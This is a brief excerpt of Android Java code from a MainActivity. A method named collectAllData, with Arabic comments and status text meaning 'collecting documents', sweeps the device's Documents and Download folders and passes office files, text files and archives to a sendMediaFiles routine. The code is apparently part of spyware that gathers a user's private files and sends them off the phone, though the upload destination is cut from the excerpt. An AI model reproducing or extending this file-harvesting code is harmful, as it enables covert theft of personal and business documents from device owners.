...
public class MainActivity extends Activity {
    ...
    private void collectAllData() {
        try {
            ...
            // مستندات أخرى
            updateStatus("📄 جاري جمع المستندات...");
            sendMediaFiles(storage + "/Documents/", "doc|docx|xls|xlsx|txt|zip|rar");
            sendMediaFiles(storage + "/Download/", "doc|docx|xls|xlsx|txt|zip|rar");
